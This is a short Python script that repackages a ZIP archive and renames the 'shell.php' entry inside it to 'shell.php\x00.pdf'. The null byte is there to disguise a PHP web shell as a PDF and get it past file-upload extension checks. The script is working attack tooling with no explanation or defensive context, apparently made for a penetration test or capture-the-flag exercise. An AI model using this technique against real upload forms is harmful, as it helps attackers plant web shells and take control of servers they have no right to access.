import zipfile
import os

# Paths
zip_path = 'shell.zip'
new_zip_path = 'shell2.zip'
old_filename = 'shell.php'
new_filename = 'shell.php\x00.pdf'

# Open the original ZIP and create a new one
with zipfile.ZipFile(zip_path, 'r') as zip_read:
    with zipfile.ZipFile(new_zip_path, 'w') as zip_write:
        for item in zip_read.infolist():
            original_data = zip_read.read(item.filename)
            # Rename the target file
            if item.filename == old_filename:
                item.filename = new_filename
            zip_write.writestr(item, original_data)

print(f'Renamed {old_filename} to {new_filename} inside {new_zip_path}')